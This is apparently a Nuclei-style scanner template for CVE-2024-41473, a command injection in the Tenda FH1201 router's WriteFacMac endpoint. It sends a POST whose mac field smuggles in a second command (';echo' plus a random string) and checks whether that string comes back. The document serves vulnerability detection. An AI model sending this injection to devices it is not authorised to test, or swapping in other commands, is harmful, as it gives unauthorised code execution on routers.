id: CVE-2024-41473

info:
  name: Tenda FH1201 - Command Injection
  author: Co5mos
  severity: critical
  description: |
    Tenda FH1201 v1.2.0.14 存在命令注入漏洞，位于 WriteFacMac 函数中。mac 参数未经任何过滤就被复制到 var 中，然后执行，因此攻击者可利用此漏洞执行任意命令
  metadata:
    cve-id: CVE-2024-41473
  tags: tenda, rce, cve, cve2024

variables:
  rand_str: "{{rand_base(8)}}"

http:
  - raw:
      - |
        POST /goform/WriteFacMac HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        mac=%3Becho%20%27{{rand_str}}%27

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, '{{rand_str}}')
        condition: and
